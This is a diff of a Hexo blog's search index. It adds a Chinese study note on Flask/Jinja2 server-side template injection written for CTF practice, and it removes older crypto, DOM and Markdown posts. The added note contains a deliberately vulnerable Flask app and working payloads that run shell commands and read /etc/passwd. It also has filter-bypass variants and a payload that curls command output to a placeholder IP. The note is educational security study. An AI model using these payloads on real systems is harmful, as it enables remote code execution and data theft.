@@ -83,105 +83,132 @@
       </tags>
   </entry>
   <entry>
-    <title>cdusec-ctf Crypto wp</title>
-    <url>/2018/11/18/cdusec-ctf-Crypto-wp/</url>
-    <content><![CDATA[<p>校赛Crypto的wp，这些题都比较简单吧，大多都能查得到，只是一些简单古典密码以及常见编码。</p>
-<a id="more"></a>
+    <title>SSTI学习</title>
+    <url>/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>最近在刷攻防世界的web题，遇到了好多个ssti的题，flask，Tornado等等，但是自己也没有好好总结过，只有之前CISCN的时候做某个题的时候大概弄懂了原理，也没有总结出payload总结等等，所以经过多个题的洗礼，来进行思考总结。</p>
+<h3 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h3><p>STTI就是服务器端模板注入(Server-Side Template Injection)，与sql注入，命令注入等等原理都差不多，都是执行了外部输入的代码，即将用户输入的数据，当作代码来执行了，成为了程序中的一部分。在Flask,Django以及Tornado中，都是MVT模式的三层架构，T就是指Template(模板技术)，Flask中常用的模板是jinja2， 模板中可以访问一些 Python 内置变量，jinja2中有三种语法：</p>
+<blockquote>
+<p>控制结构 &#123;% %&#125;</p>
+<p>变量取值 &#123;&#123; &#125;&#125;</p>
+<p>注释 &#123;#   #&#125;</p>
+</blockquote>
+<p>jinja2中使用&#123;&#123; &#125;&#125;语法来表示一个变量，当利用jinja2进行渲染的时候就会执行，jinja2也支持Python中的所有数据类型，例如基本数据类型，列表，字典，对象等。</p>
+<p>使用以下代码来进行简单测试(使用的环境是python3.7)：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span> </span><br><span class="line">  <span class="keyword">return</span> open(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/test/&lt;path:str&gt;') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(str)</span>:</span></span><br><span class="line">  <span class="keyword">return</span> flask.render_template_string(str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>: </span><br><span class="line">  app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
 
-<h3 id="1、签到"><a href="#1、签到" class="headerlink" title="1、签到"></a>1、签到</h3><p>复制输入即可，我给了一个链接，没有认真去看的23333 吃亏。</p>
-<h3 id="2、凯撒"><a href="#2、凯撒" class="headerlink" title="2、凯撒"></a>2、凯撒</h3><p>简单的凯撒加密，key为4，在线工具丢进去即可。</p>
-<h3 id="3、fuck！这是什么鬼"><a href="#3、fuck！这是什么鬼" class="headerlink" title="3、fuck！这是什么鬼"></a>3、fuck！这是什么鬼</h3><p>jsfuck,说到底也是js代码，一样能够像js一样执行，复制丢进浏览器的控制台就得flag。</p>
-<h3 id="4、不一样的morse"><a href="#4、不一样的morse" class="headerlink" title="4、不一样的morse"></a>4、不一样的morse</h3><p>morse的中文编码xmorse，在线网站丢进去完事。</p>
-<h3 id="5、你熟悉键盘吗？"><a href="#5、你熟悉键盘吗？" class="headerlink" title="5、你熟悉键盘吗？"></a>5、你熟悉键盘吗？</h3><p>一共5组字符串，一个字符串代表一个字母，在键盘上比划一下可以得到ANgLA。</p>
-<h3 id="6、蕾蕾姐被表白了"><a href="#6、蕾蕾姐被表白了" class="headerlink" title="6、蕾蕾姐被表白了"></a>6、蕾蕾姐被表白了</h3><p>手机的9键拼音输入法加密，每2个数字对应一个字符，例如33，表示第三个键，第三个字符，即f，其他一样然后解出flag。</p>
-<h3 id="7、奇怪的字符串"><a href="#7、奇怪的字符串" class="headerlink" title="7、奇怪的字符串"></a>7、奇怪的字符串</h3><p>Y对应1，N对应0，全部替换后二进制转字符串。</p>
-<h3 id="8、the-other-base’s-member"><a href="#8、the-other-base’s-member" class="headerlink" title="8、the other base’s member"></a>8、the other base’s member</h3><p>base58，在线网站解码即可。</p>
-<h3 id="9、easy-base-family"><a href="#9、easy-base-family" class="headerlink" title="9、easy_base_family"></a>9、easy_base_family</h3><p>base16，32，64混合编码，解码脚本：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">'base_family.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">flag=f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b16decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b32decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        flag=base64.b64decode(flag)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
-<h3 id="10、蕾蕾姐的id"><a href="#10、蕾蕾姐的id" class="headerlink" title="10、蕾蕾姐的id"></a>10、蕾蕾姐的id</h3><p>md5爆破，会有多解的情况，只有一个正确。解密脚本：</p>
-<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">import hashlib</span><br><span class="line">import sys</span><br><span class="line">keyword1=<span class="string">"41d"</span><span class="comment">#后三位</span></span><br><span class="line">keyword2=<span class="string">"fdc"</span><span class="comment">#2-5位</span></span><br><span class="line">key=[<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> key:</span><br><span class="line">	<span class="keyword">for</span> b <span class="keyword">in</span> key:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> key:</span><br><span class="line">			<span class="keyword">for</span> d <span class="keyword">in</span> key:</span><br><span class="line">				word=str(a)+str(b)+str(c)+str(d)</span><br><span class="line">				flag=hashlib.md5(word)</span><br><span class="line">				<span class="keyword">if</span> flag.hexdigest()[-<span class="number">3</span>:]==keyword1 and flag.hexdigest()[<span class="number">2</span>:<span class="number">5</span>]==keyword2:</span><br><span class="line">					print flag.hexdigest()</span><br><span class="line">					sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+<p>启动后访问 <a href="http://127.0.0.1/test/&#123;&#123;1+1&#125;&#125;可以发现页面显示了一个2，即&#123;&#123;1+1&#125;&#125;中的代码进行了执行。" target="_blank" rel="noopener">http://127.0.0.1/test/&#123;&#123;1+1&#125;&#125;可以发现页面显示了一个2，即&#123;&#123;1+1&#125;&#125;中的代码进行了执行。</a><br>这段代码是一个典型的SSTI漏洞示例，漏洞成因在于：<code>render_template_string</code>函数在渲染模板的时候直接把输入的字符串进行了返回渲染，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，&#123;&#123; &#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123; &#125;&#125;包裹的内容当做变量解析替换。此时&#123;&#123;1+1&#125;&#125;会被解析成2。(我想起了jsp中使用el表达式也是这种差不多的语法，是否也能进行模板注入？)</p>
+<h3 id="0x02-扩展深入"><a href="#0x02-扩展深入" class="headerlink" title="0x02 扩展深入"></a>0x02 扩展深入</h3><h4 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h4><p>当我们在启用一个python解释器的时候，没有进行任何导包/创建变量/创建函数等等操作，还是有很多函数可以使用，这些函数叫做内建函数，这些函数在python解释器启动的时候就自动加载到内存中供我们使用。<br>这里需要提到一个命名空间的东西，这个在其他编程语言中也有相关的东西。</p>
+<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间"></a>名称空间</h4><p>官方文档的一段话： </p>
+<blockquote>
+<p> <em>A namespace is a mapping from names to objects.Most namespaces are currently implemented as Python dictionaries。</em> </p>
+</blockquote>
+<p>命名空间(Namespace)是从名称到对象的映射，大部分的命名空间都是通过 Python 字典来实现的。命名空间提供了在项目中避免名字冲突的一种方法。各个命名空间是独立的，没有任何关系的，所以一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。</p>
+<p>一般有三种命名空间：   </p>
+<blockquote>
+<p><strong>内置名称（built-in names</strong>）， Python 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。<br><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。<br><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）</p>
+</blockquote>
+<h4 id="命名空间的”顺序”"><a href="#命名空间的”顺序”" class="headerlink" title="命名空间的”顺序”"></a>命名空间的”顺序”</h4><p><strong>查找顺序：</strong></p>
+<p>比如说我们要使用一个变量 test，则 Python 的查找顺序为：</p>
+<blockquote>
+<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
+</blockquote>
+<p>如果找不到变量 runoob，它将放弃查找并引发一个 NameError 异常:</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E7%9A%84%E9%A1%BA%E5%BA%8F_test.png" alt="0x02_命名空间的顺序_test.png"></p>
+<p><strong>加载顺序：</strong></p>
+<p>这个想都不用想，开始说了python解释器启动时就会加载内置函数，那么加载顺序肯定是内置命名空间最先加载，跟查找顺序恰恰相反。</p>
+<blockquote>
+<p>局部名称空间——&gt;全局名称空间—–&gt;内置名称空间</p>
+</blockquote>
+<p>我们主要关注的是内建名称空间，是名字到内建对象的映射，在python中，初始的<strong>builtins</strong>模块提供内建名称空间到内建对象的映射。</p>
+<p>dir()函数用于查看一个对象的属性有哪些，在没有提供参数的时候，会将返回当前环境导入的所有模块进行返回，我们可以看初始模块有哪些</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir.png" alt="0x02_dir.png"></p>
+<p>可以看到<strong>builtins</strong>是作为一个默认初始模块出现的，那么可以使用dir()查看<strong>builtins</strong>模块下的属性。</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_dir(__builtins__).png" alt="0x02_dir(__builtins__).png"></p>
+<p>在这个里面我们可以看到很多熟悉的关键字，len，hash，hex，input等等，这也是解释了为什么我们不需要导入这些包就能使用这些函数，因为就是通过默认模块导入了。</p>
+<p>当然我们也能自己手动再导入，再调用其中的方法，如：</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x02_import_builtins.png" alt="0x02_import_builtins.png"></p>
+<p>注：python3中__builtins__是引用的builtins模块，而python2中__builtins__是引用的__builtin__，所以python2中应该是<code>import __builtin__</code></p>
+<h4 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h4><p>说到类继承就想到了js中的原型链污染，都是一个继承链来的。</p>
+<p>python中对一个变量可以通过一些继承的方法，找到继承链，通常要用到以下方法</p>
+<blockquote>
+<p><strong>__class__</strong>： 万物皆对象，而class用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code></p>
+<p><strong>__base__</strong> ：对象的一个基类，一般情况下是object，有时不是，这时需要使用下一个方法。</p>
+<p><strong>__base__</strong> ：以元组的形式返回一个类所直接继承的类。 </p>
+<p><strong>__mro__</strong> ：同样可以获取对象的基类，只是这时会显示出整个继承链的关系(继承树)，是一个列表，object在最底层，即在列表中的最后，通过<strong>__mro__[-1]</strong>可以获取到。</p>
+<p><strong>__subclasses__()</strong> ：继承此对象的子类，返回一个列表。</p>
+<p> <strong>__init__</strong>：所有自带类都包含__init__方法。 </p>
+</blockquote>
+<p>有这些类继承的方法，我们就可以从任何一个变量，回溯到基类中去，再获得到此基类所有实现的类，就可以获得到各种“危险”类，然后调用类中的危险方法进行命令执行。</p>
+<h4 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h4><p>这里介绍几个常见的函数，有助于后续的理解</p>
+<blockquote>
+<p><strong>__dict__：</strong>类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__ 属性中的。每个类有自己的<strong>__dict__</strong>属性，就算存在继承关系，父类的__dict__ 并不会影响子类的__dict__ 对象也有自己的__dict__ 属性</p>
+<p><strong>__globals__：</strong>function.__globals__该属性是函数特有的属性，用于获取function所处空间下可使用的模块、方法以及所有变量。记录当前文件全局变量的值,如果某个文件调用了os、sys等库,但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用__globals__属性访问全局的变量。该属性保存的是函数全局变量的字典引用。</p>
+<p><strong>__getattribute__()：</strong>实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行<code>.</code>操作的时候（形如：<code>a.xxx/a.xxx()</code>），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</p>
+</blockquote>
+<h3 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h3><p>利用上面讲到的类继承的思想，可以总结出一个利用流程：</p>
+<blockquote>
+<p>从一个变量开始-&gt;获得对象-&gt;获得基类-&gt;获得子类-&gt;遍历子类-&gt;子类中寻找可以利用的类</p>
+</blockquote>
+<p>或者说：</p>
+<blockquote>
+<p>任意找一个内置类对象，通过__class__获取到它对应的类</p>
+<p>通过__base__获取到基类<code>&lt;class &#39;object&#39;&gt;</code></p>
+<p>通过__subclasses__()获取到基类的所有子类</p>
+<p>在子类中寻找可以利用的类</p>
+<p>例如：””.__class__.__base__.__subclasses__()   ——python3</p>
+</blockquote>
+<h4 id="寻找可以利用的类"><a href="#寻找可以利用的类" class="headerlink" title="寻找可以利用的类"></a>寻找可以利用的类</h4><p>例如我们要寻找可以使用popen的类</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="meta">#Anaconda自带的python3.7.3</span></span><br><span class="line">aim = <span class="string">"popen"</span></span><br><span class="line">order = -<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> <span class="string">""</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>():</span><br><span class="line">    order+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> aim <span class="built_in">in</span> i.<span class="variable">__init__</span>.<span class="variable">__globals__</span>.keys():</span><br><span class="line">            print(i,order)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
 
-<h3 id="11、棋局"><a href="#11、棋局" class="headerlink" title="11、棋局"></a>11、棋局</h3><p>简单的棋盘加密，可以发现密文只有5个字母，urtql,附件的提示说flag的内容长度为10,想到棋盘加密。<br>解密脚本:   </p>
-<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">key = []</span><br><span class="line">cipher = <span class="string">"rquutrqqrtulrutuuurr"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in itertools.permutations(<span class="string">'tqlur'</span>, <span class="number">5</span>):</span><br><span class="line">    key.<span class="keyword">append</span>(<span class="string">''</span>.<span class="keyword">join</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> now_key in key:</span><br><span class="line">    solve_c = <span class="string">""</span></span><br><span class="line">    <span class="keyword">res</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> now_c in cipher:</span><br><span class="line">        solve_c += str(now_key.<span class="built_in">index</span>(now_c))</span><br><span class="line">    <span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(solve_c),<span class="number">2</span>):</span><br><span class="line">        now_ascii = <span class="keyword">int</span>(solve_c[i])*<span class="number">5</span>+<span class="keyword">int</span>(solve_c[i+<span class="number">1</span>])+<span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> now_ascii&gt;ord(<span class="string">'i'</span>):</span><br><span class="line">            now_ascii+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">res</span> += chr(now_ascii)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag"</span> in re<span class="variable">s:</span></span><br><span class="line">        <span class="keyword">print</span> now_key,<span class="keyword">res</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_find_popen.png" alt="0x03_find_popen.png"></p>
+<p>然后就可以进行命令执行：</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">-1</span>].<span class="strong">__subclasses__</span>()[<span class="string">128</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>
 
-<p>觉得这个难？全都在这里：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/classical/polyalphabetic/" target="_blank" rel="noopener">点击查看</a><br>关于棋盘加密的知识，以及本题的解密脚本都在里面。</p>
+<h4 id="payload解析"><a href="#payload解析" class="headerlink" title="payload解析"></a>payload解析</h4><p>python中万物皆对象，前面学习类继承的时候提到可以回溯到基类中，例如上面payload中，使用一个空字符串调用__class__获取到是属于字符串类，而__bases[-1]__是获取到继承链的最后一个类(即基类)<code>&lt;class &#39;object&#39;&gt;</code>，__subclasses__()获取基类的所有子类，返回了一个列表，[128]取到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>这个类。我在学习这个payload的时候不懂为什么要调用__init__，自己写了一个例子就发现了问题所在。</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85pyload%E8%A7%A3%E6%9E%90.png" alt="0x03_补充pyload解析.png"></p>
+<p>噢原来只是找到这个函数呀，我开始以为是调用了__init__()函数，这里只是个函数指针罢了。让我们再看一下__globals__的作用：</p>
+<blockquote>
+<p>用于获取function所处空间下可使用的模块、方法以及所有变量。</p>
+</blockquote>
+<p>__init__是每个类都有的函数，那么通过__init__调用__globals__就得到了这个类中的各种模块，方法跟变量(字典格式)，如果有popen函数的话，就可以通过__init__.__globals__[‘popen’]来获取到popen的函数指针了，接下来的就是执行命令就不再赘述了。关于__init__的理解我还写了一个小例子，如下：</p>
+<p><img src="/2020/06/14/SSTI%E5%AD%A6%E4%B9%A0/0x03_%E8%A1%A5%E5%85%85_example.png" alt="0x03_补充_example.png"></p>
+<p>可以看到通过调用__init__.__globals__获取到的模块跟通过dir()获取到的相同，包括导入的os模块也在其中。</p>
+<h3 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h3><p>啊这里就不总结了，思路就是那样子，本文基于python3来的，2有一些区别，思路都差不多。</p>
+<h3 id="0x05-常见绕过方式"><a href="#0x05-常见绕过方式" class="headerlink" title="0x05 常见绕过方式"></a>0x05 常见绕过方式</h3><p>![E:\Hexo\source_posts\SSTI学习](0x0x5_bypass.png)</p>
+<p>观察payload中出现的符号，采取对应的bypass思路(以下是python2，获取的40是file，python3中__subclasses__()没有file)。</p>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p> <code>request.args</code> 是flask中的一个属性,为返回请求的参数,这里把<code>path</code>当作变量名,将后面的路径传值进来,进而绕过了引号的过滤</p>
+<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="comment">()</span>.__class__.__bases__.__getitem__<span class="comment">(0)</span>.__subclasses__<span class="comment">()</span>.pop<span class="comment">(40)</span><span class="comment">(request.args.path)</span>.read<span class="comment">()</span>&#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><p>同样利用<code>request.args</code>属性</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123; ''[<span class="string">request.args.class</span>][<span class="symbol">request.args.mro</span>][<span class="string">2</span>][<span class="symbol">request.args.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;&amp;class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=__subclasse</span><br></pre></td></tr></table></figure>
+
+<p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">&#123;&#123; ''[<span class="string">request.value.class</span>][<span class="symbol">request.value.mro</span>][<span class="string">2</span>][<span class="symbol">request.value.subclasses</span>]()[<span class="string">40</span>](<span class="link">'/etc/passwd'</span>).read() &#125;&#125;</span><br><span class="line">POST:</span><br><span class="line">class=<span class="strong">__class__</span>&amp;mro=<span class="strong">__mro__</span>&amp;subclasses=<span class="strong">__subclasses__</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>list有个__getitem__方法，还有个pop方法，都能绕过，dict有get等方法，都可以通过查看__dict__来查阅。</p>
+<h4 id="过滤双花括号"><a href="#过滤双花括号" class="headerlink" title="过滤双花括号"></a>过滤双花括号</h4><figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;% if ''.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="name">'curl</span> http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>base64编码绕过</strong><br><code>__getattribute__</code>使用实例访问属性时,调用该方法</p>
+<p>例如被过滤掉<code>__class__</code>关键词</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('X19jbGFzc19f'.decode('base64')).<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>字符串拼接绕过</strong></p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[<span class="string"></span>].<span class="strong">__getattribute__</span>('<span class="strong">__c'+'lass__</span>').<span class="strong">__base__</span>.<span class="strong">__subclasses__</span>()[<span class="string">40</span>](<span class="link">"/etc/passwd"</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-后记"><a href="#0x06-后记" class="headerlink" title="0x06 后记"></a>0x06 后记</h3><p><strong>不利用<strong>globals</strong></strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">59</span>]()._module.linecache.os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>timeit</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>platform</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(<span class="string">'dir'</span>).read()</span><br></pre></td></tr></table></figure>
+
+<p> <strong>from_object</strong> </p>
+<p>太多了。。。暂时不总结了，这里主要概括为使用框架的内省对象。所有总结就到此结束了</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DOM,BOM</title>
-    <url>/2018/10/22/DOM-BOM/</url>
-    <content><![CDATA[<p>关于DOM与BOM的简介</p>
-<a id="more"></a>
-
-<h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM= Document Object Model，文档对象模型，DOM可以以一种独立于平台和语言的方式访问和修改一个文档的内容和结构。换句话说，这是表示和处理一个HTML或XML文档的常用方法。有一点DOM很重要，DOM的设计是以对象管理组织（OMG）的规约为基础的，因此可以用于任何编程语言。最初人们把它认为是一种让JavaScript在浏览器间可移植的方法，不过DOM的应用已经远远超出这个范围。Dom技术使得用户页面可以动态地变化，如可以动态地显示或隐藏一个元素，改变它们的属性，增加一个元素等，Dom技术使得页面的交互性大大地增强。</p>
-<h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>提供了独立于内容而与浏览器窗口进行交互的对象。描述了与浏览器进行交互的方法和接口，可以对浏览器窗口进行访问和操作，譬如可以弹出新的窗口，改变状态栏中的文本，对Cookie的支持，IE还扩展了BOM，加入了ActiveXObject类，可以通过js脚本实例化ActiveX对象等等.</p>
-<p>Window对象：<br>是整个BOM的核心，所有对象和集合都以某种方式回接到window对象。Window对象表示整个浏览器窗口，但不必表示其中包含的内容。<br>Document对象：<br>实际上是window对象的属性。这个对象的独特之处是唯一一个既属于BOM又属于DOM的对象。从BOM角度看，document对象由一系列集合构成，这些集合可以访问文档的各个部分。<br>Location对象：<br>它是window对象和document对象的属性。Location对象表示载入窗口的URL，此外它还可以解析URI.<br>Navigator对象：<br>Navigator包含大量Web浏览器相关的信息。各种浏览器支持该对象的属性和方法不尽相同。<br>Screen对象：<br>通过其可以获取用户屏幕相关的信息</p>
-]]></content>
-      <tags>
-        <tag>web FE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>如何写一篇hexo博客</title>
-    <url>/2018/09/04/%E5%A6%82%E4%BD%95%E5%86%99hexo%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>本文介绍如何使用Hexo写出一篇‘比较’好看的文章，几句简单的语法，喜欢简介的话，可能就刚好适用。</p>
-<a id="more"></a>
-
-<hr>
-<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><blockquote>
-<p>这是一个引用,使用&gt;符号，置于文本前。(为方便阅读，下面的内容均使用了引用)</p>
-</blockquote>
-<hr>
-<h3 id="图片与链接"><a href="#图片与链接" class="headerlink" title="图片与链接"></a>图片与链接</h3><blockquote>
-<p>图片：！[](图片地址)</p>
-</blockquote>
-<blockquote>
-<p>网址：[]()</p>
-</blockquote>
-<hr>
-<h3 id="粗体与斜体"><a href="#粗体与斜体" class="headerlink" title="粗体与斜体"></a>粗体与斜体</h3><blockquote>
-<p>粗体：用两个*包含一段文本就是粗体。    例：<strong>粗体</strong></p>
-</blockquote>
-<blockquote>
-<p>斜体：用一个*包含一段文本就是斜体</p>
-</blockquote>
-<hr>
-<h3 id="代码框"><a href="#代码框" class="headerlink" title="代码框"></a>代码框</h3><blockquote>
-<p>使用两个`把中间的代码包含起来，例如：</p>
-</blockquote>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">hello <span class="built_in">word</span>!</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h3><blockquote>
-<p>分割线的语法只需要加三个-号或*(是不是发现一直再用分割线hhh<del>~</del>)</p>
-</blockquote>
-<hr>
-]]></content>
-      <tags>
-        <tag>hexo学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初探csrf以及如何利用</title>
-    <url>/2019/01/16/%E5%88%9D%E6%8E%A2csrf%E4%BB%A5%E5%8F%8A%E7%AC%AC%E4%B8%80%E4%B8%AAcsrf%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>csrf学过有很长一段时间了，之前也就简单的知道这个是什么东西，大概是怎么实现，没有亲自挖掘到过，有幸的是在上周挖掘到两个，这里小小的记录一下</p>
-<a id="more"></a>
-
